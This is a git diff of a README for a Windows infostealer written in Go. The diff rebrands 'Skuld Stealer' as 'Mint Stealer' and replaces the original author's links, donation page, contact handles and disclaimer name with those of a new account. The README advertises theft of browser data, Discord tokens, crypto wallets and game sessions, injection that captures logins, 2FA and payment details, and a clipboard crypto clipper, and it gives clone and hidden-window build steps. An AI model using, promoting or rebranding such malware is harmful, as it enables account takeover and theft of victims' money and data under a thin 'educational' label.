@@ -1,8 +1,8 @@
 <div align="center">
-<a href="https://github.com/hackirby/skuld/network/members"><img src="https://img.shields.io/github/forks/hackirby/skuld.svg?style=for-the-badge&color=b143e3" alt="Forks"></a>
-<a href="https://github.com/hackirby/skuld/stargazers"><img src="https://img.shields.io/github/stars/hackirby/skuld.svg?style=for-the-badge&color=b143e3" alt="Stargazers"></a>
-<a href="https://github.com/hackirby/skuld/issues"><img src="https://img.shields.io/github/issues/hackirby/skuld.svg?style=for-the-badge&color=b143e3" alt="Issues"></a>
-<a href="https://github.com/hackirby/skuld/blob/main/LICENSE"><img src="https://img.shields.io/github/license/hackirby/skuld.svg?style=for-the-badge&color=b143e3" alt="MIT License"></a>
+<a href="https://github.com/0xFl4q/1237FHJQSDF1234/network/members"><img src="https://img.shields.io/github/forks/0xFl4q/1237FHJQSDF1234.svg?style=for-the-badge&color=b143e3" alt="Forks"></a>
+<a href="https://github.com/0xFl4q/1237FHJQSDF1234/stargazers"><img src="https://img.shields.io/github/stars/0xFl4q/1237FHJQSDF1234.svg?style=for-the-badge&color=b143e3" alt="Stargazers"></a>
+<a href="https://github.com/0xFl4q/1237FHJQSDF1234/issues"><img src="https://img.shields.io/github/issues/0xFl4q/1237FHJQSDF1234.svg?style=for-the-badge&color=b143e3" alt="Issues"></a>
+<a href="https://github.com/0xFl4q/1237FHJQSDF1234/blob/main/LICENSE"><img src="https://img.shields.io/github/license/0xFl4q/1237FHJQSDF1234.svg?style=for-the-badge&color=b143e3" alt="MIT License"></a>
 </div>
 
 <br>
@@ -13,7 +13,7 @@
 
 
 
-<h1 align="center">Skuld Stealer</h1>
+<h1 align="center">Mint Stealer</h1>
 
 <p align="center">Go-written Malware targeting Windows systems, extracting User Data from Discord, Browsers, Crypto Wallets and more, from every user on every disk. (PoC. For Educational Purposes only)</p>
 
@@ -65,14 +65,14 @@ This proof of concept project demonstrates a "Discord-oriented" stealer implemen
 - **Wallet Data Theft:** Steals data from 10 local wallets and 55 wallet extensions. 💰
 - **Discord Tokens Theft:** Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
 - **Games Data Theft:** Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions. 🎮
-- **[Discord Injection:](https://github.com/hackirby/discord-injection)**
+- **[Discord Injection:](https://github.com/Mint/discord-injection)**
   - Intercepts login, register, and 2FA login requests.
   - Captures backup codes requests.
   - Monitors email/password change requests.
   - Intercepts credit card/PayPal addition requests.
   - Blocks the use of QR codes for login.
   - Prevents requests to view devices.
-- **[Crypto Wallets Injection:](https://github.com/hackirby/wallets-injection)**
+- **[Crypto Wallets Injection:](https://github.com/Mint/wallets-injection)**
   - Captures mnemonic phrases.
   - Captures passwords.
 - **Crypto Clipper:** Replaces the user's clipboard content with a specified crypto address when copying another address. 📋
@@ -89,12 +89,12 @@ To install this project using Git, follow these steps:
 - Clone the Repository:
 
 ```bash
-git clone https://github.com/hackirby/skuld
+git clone https://github.com/0xFl4q/1237FHJQSDF1234
 ```
 - Navigate to the Project Directory:
 
 ```bash
-cd skuld
+cd Mint
 ```
 
 ## Usage
@@ -112,12 +112,12 @@ go build -ldflags "-s -w -H=windowsgui"
 ```
 
 
-but you can also use skuld in your own Go code. Just import the desired module like this:
+but you can also use Mint in your own Go code. Just import the desired module like this:
 ```go
 package main
 
 import (
-  "github.com/hackirby/skuld/modules/hideconsole"
+  "github.com/0xFl4q/1237FHJQSDF1234/modules/hideconsole"
 )
 
 func main() {
@@ -145,18 +145,18 @@ func main() {
 I am considering working on these features, but I'm not completely certain yet. However, please feel free to open a pull request to add these features. 
 
 ## Contributing
-Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Make sure to follow the [Contributing Guidelines](https://github.com/hackirby/skuld/blob/main/CONTRIBUTING.md)
+Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Make sure to follow the [Contributing Guidelines](https://github.com/0xFl4q/1237FHJQSDF1234/blob/main/CONTRIBUTING.md)
 
 You can also support this project development by leaving a star ⭐ or by donating me. Every little tip helps!
 
-<a href='https://ko-fi.com/hackirby'><img src='assets/kofi.png' width=150></a>
+<a href='https://ko-fi.com/Mint'><img src='assets/kofi.png' width=150></a>
 
 ## License
 This library is released under the MIT License. See LICENSE file for more informations.
 
 ## Contact
-If you have any questions or need further assistance, please contact [@hackirby:matrix.org
-](https://matrix.to/#/@hackirby:matrix.org)
+If you have any questions or need further assistance, please contact [@Mint:matrix.org
+](https://matrix.to/#/@Mint:matrix.org)
 
 ## Acknowledgments
 This project has been greatly influenced by numerous infostealers available on GitHub. Many functions and sensitive paths have been derived from public repositories. My objective was to innovate by creating something new with code from existing projects. I extend my gratitude to all those whose work has contributed to this stealer, especially
@@ -168,19 +168,19 @@ This project has been greatly influenced by numerous infostealers available on G
 
 ### Important Notice: This tool is intended for educational purposes only.
 
-This software, referred to as skuld, is provided strictly for educational and research purposes. Under no circumstances should this tool be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.
+This software, referred to as Mint, is provided strictly for educational and research purposes. Under no circumstances should this tool be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.
 
 ### Usage Responsibility:
 
-By accessing and using this tool, you acknowledge that you are solely responsible for your actions. Any misuse of this software is strictly prohibited, and the creator (hackirby) disclaims any responsibility for how this tool is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.
+By accessing and using this tool, you acknowledge that you are solely responsible for your actions. Any misuse of this software is strictly prohibited, and the creator (Mint) disclaims any responsibility for how this tool is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.
 
 ### No Liability:
 
-The creator (hackirby) of this tool shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use the tool.
+The creator (Mint) of this tool shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use the tool.
 
 ### No Support:
 
-The creator (hackirby) will not provide any support, guidance, or assistance related to the misuse of this tool. Any inquiries regarding malicious activities will be ignored.
+The creator (Mint) will not provide any support, guidance, or assistance related to the misuse of this tool. Any inquiries regarding malicious activities will be ignored.
 
 ### Acceptance of Terms:
 
